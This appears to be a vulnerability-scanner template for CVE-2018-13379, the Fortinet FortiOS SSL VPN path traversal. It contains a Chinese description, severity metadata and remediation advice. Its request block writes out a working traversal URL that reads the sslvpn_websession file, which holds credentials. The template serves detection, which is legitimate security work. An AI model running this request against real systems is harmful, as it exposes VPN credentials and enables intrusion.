id: CVE-2018-13379
info:
  name: Fortinet FortiOS - Credentials Disclosure
  author:
  - l0ne1y
  tags:
  - cve
  - cve2018
  - fortios
  description: |-
    Fortinet FortiOS 路径遍历漏洞
    Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。

    Fortinet FortiOS 5.6.3版本至5.6.7版本和6.0.0版本至6.0.4版本中的SSL VPN Web门户存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。
  reference:
  - https://fortiguard.com/advisory/fg-ir-18-384
  - https://www.fortiguard.com/psirt/fg-ir-20-233
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2018-13379
  severity: critical
  classification:
    cve-id:
    - cve-2018-13379
    cwe-id:
    - cwe-22
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: "**官方修复方案**\n目前厂商已发布升级补丁以修复漏洞，补丁获取链接：\nhttps://fortiguard.com/psirt/FG-IR-18-384\n\n**临时修复方案**\n1、系统开发阶段的防御，在系统开发阶段应充分考虑系统的安全性，对目录遍历漏洞来说，需对用户提交的内容进行严格的过滤，这里主要指过滤目录跳转符，字符截断符，dir命令等。\n2、系统运行阶段的防御，系统运维人员需有强烈的安全意识，他们的一举一动都会影响用户的个人隐私信息安全。对系统运维人员来说，部署新的业务系统或者安装新的软件或应用后应通过web扫描工具积极查找系统是否存在目录遍历漏洞，尽可能不要在服务器上安装与业务不相关的第三方软件以避免引入目录遍历漏洞。除此之外，还应该合理配置web服务器（禁止目录浏览，分配好目录权限等）并积极关注所使用的各种软件和应用的版本发布情况，及时升级新的软件版本。'\n3、服务器配置，为更好的保护系统安全，实际生产环境和测试开发环境应该隔离。在生产环境中的任何改动，都需要严格遵循变更管理流程，做到执行人、执行时间、执行对象和具体改动均记录在案，并有企业信息安全部门进行事前审核和事后审计。技术人员一般不要直接调试生产系统，可以在测试环境中调试完成后再更新生产系统，以避免调试过程中开启某些接口、更改某些配置或者保存某些调试信息造成安全隐患。如果非要在线调试生产系统，而且需要保存调试信息时，应避免将调试信息直接保存到服务器本地，同时调试完成后应第一时间删除相关调试信息并恢复系统配置。\n
    \ 1）IIS：打开 IIS 管理器，然后导航至您要管理的级别；在“功能视图”中，双击“目录浏览”；在“操作”窗格中，选择“目录浏览”功能，单击“禁用”。\n
    \ 2）Nginx：找到Nginx配置文件中的“autoindex”，设置为“off”，然后重启Nginx。\n  3）Apache：修配置文件httpd.conf，把：Options
    Indexes FollowSymLinks 改为：Options -Indexes FollowSymLinks ，然后重启Apache。\n  4）Tomcat：在应用的WEB-INF目录找到web.xml配置文件，将“listings”参数的初始化值设置为“false”，然后重启Tomcat。
    \ \n4、安全设备的防御，进行目录遍历攻击时，攻击者基本都会使用目录跳转符，同时可能配合使用字符截断符，dir命令等。对专业的安全设备来说通过检测特定语法下的目录跳转符，字符截断符，以及与查看目录相关的命令即可识别各种目录遍历攻击。部署专业的安全设备不仅可以很好的保护业务系统自身的目录遍历漏洞，同时还能防御web服务器和服务器上其他非业务相关的第三方应用漏洞引发的目录遍历攻击。"
requests:
- matchers:
  - type: word
    words:
    - var fgt_lang
  path:
  - '{{BaseURL}}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
  method: GET
